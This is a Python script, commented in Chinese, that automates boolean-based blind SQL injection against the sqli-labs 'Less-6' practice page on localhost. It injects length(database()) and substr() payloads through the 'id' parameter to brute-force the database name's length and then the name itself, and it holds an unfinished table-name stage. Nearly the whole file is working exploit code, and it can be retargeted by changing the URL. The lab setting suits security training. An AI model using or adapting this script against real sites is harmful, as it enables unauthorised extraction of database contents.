#布尔盲注
#该脚本只爆破数据库长度和数据库名
#该脚本的使用:需要配置两个函数中的url(这里的url包括了目标的地址以及后面的参数)，
# 遍历字符串集，header中的cookie（浏览器使用f12查看，或者查看数据包）
#注入成功的条件判断

#这里是post请求格式，如果是post请求可以根据该格式修改
#url = "http://httpbin.org/post"
# data = {'key1': 'value1', 'key2': 'value2'}
# response = requests.post(url, data=data)
# print(response.text)

import requests,string

#布尔盲注得到数据库长度
def get_database_lenth():
    #需要配置的地方：要遍历的字符串集，url，header中的cookie，
    #要遍历的字符串集，这里遍历的是长度，可以根据实际情况修改
    condition="You"                  #判断条件
    length=range(1,50)
    for len in length:
        #查看浏览器登陆后的cookie，加入到请求头中
        # header={"cookie":"PHPSESSID=7c9e936cdd01dce0e7ad5cf286ee8f15"}
        url=f'http://localhost/sqli-labs-master/Less-6?id=1" and length(database()) ={len}--+'
        resp = requests.get(url=url)  #,headers=header         如果需要登录要加上cookie时将前面复制进括号中
        if condition in resp.text:      #判断条件也要根据情况定,这里使用的是看成功返回的文本中是否含有字符按Web
            print("盲注成功，数据库长度为",len)
            return len
        # print(resp.text)

#布尔盲注得到数据库名
def get_database_name(length):
    database=""
    position=1
    condition = "You"
    #包含所有大小写字母，数字以及后面的符号的字符串集
    # charset = string.ascii_letters + string.digits + "_$-@."
    charset="abcdefghijklmnopqrstuvwxyz0123456789"
    while True:
        for char in charset:
            # header = {"cookie": "PHPSESSID=91d4b17ea311dc675456414da6798594"}
            url = f'http://localhost/sqli-labs-master/Less-6?id=1" and substr(database(),{position},1)="{char}"--+'
            resp = requests.get(url=url)  # , headers=header
            if condition in resp.text:      #判断条件也要根据情况定
                database+=char
                position+=1
            if position > length:
                return database
#布尔盲注得到数据库的表名
# def get_table_name(database):
#     column=[]
#     charset = string.ascii_letters + string.digits + "_$-@."
#     while True:
#         for cahr in charset:

if __name__ == '__main__':
    # try:
        database=get_database_name(get_database_lenth())
        print(f'盲注成功,数据库名字为{database}')
    # except:
    #     pass
    # get_colunm_name("learn")